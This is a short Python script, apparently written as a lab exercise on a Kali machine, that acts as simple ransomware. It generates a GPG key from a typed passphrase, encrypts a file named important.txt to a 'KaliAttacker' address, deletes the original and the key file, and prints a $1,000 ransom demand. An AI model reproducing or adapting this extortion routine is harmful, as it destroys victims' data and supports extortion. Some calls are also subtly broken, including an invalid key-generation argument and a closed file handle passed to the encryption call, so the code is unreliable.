#!/usr/bin/env python3
import sys, gnupg, os

homedir = "/home/kali/Desktop/.gnupg"
gpg = gnupg.GPG(homedir)
## desktop path
path = "/home/kali/Desktop/"

## get attacker's key in kali.
userInput = input("Enter a Encrypt Key: ")

## save key into key.txt
with open("key.txt", "w") as f:
    f.write(userInput)

## generate key using attacker's key above
key_generate = gpg.gen_key_input(
    attacker_email = "KaliAttacker@mymail.com",
    passphrase = userInput
    )

key = gpg.gen_key(key_generate)
## check if theres key
# print(key)

## cipher public and private in ascii then export it
## https://gnupg.readthedocs.io/en/latest/
ascii_armored_public_keys = gpg.export_keys(key.fingerprint) # same as gpg.export_keys(keyids, False)
ascii_armored_private_keys = gpg.export_keys(keyids = key.fingerprint, passphrase=userInput, secret = True)

## create/open new file and write the keys inside
with open("encrypted_key.asc", "w") as fw:
    fw.write(ascii_armored_private_keys)
    fw.write(ascii_armored_public_keys)

## encrypt important.txt
with open("important.txt", "rb") as fe:
    status = gpg.encrypt_file(f, recipients=["KaliAttacker@mymail.com"], output = "encrypted_message.asc")
print(status.ok)

## delete the key.txt file and important.txt, printing the message
if os.path.exists("key.txt"):
    os.remove("key.txt")
    os.remove("important.txt")
    print("Your file important.txt have been encrypted. To decrypt it, you'll need to pay me $1,000 and send encrypted_key.asc to decrypt your file")
else:
    pass

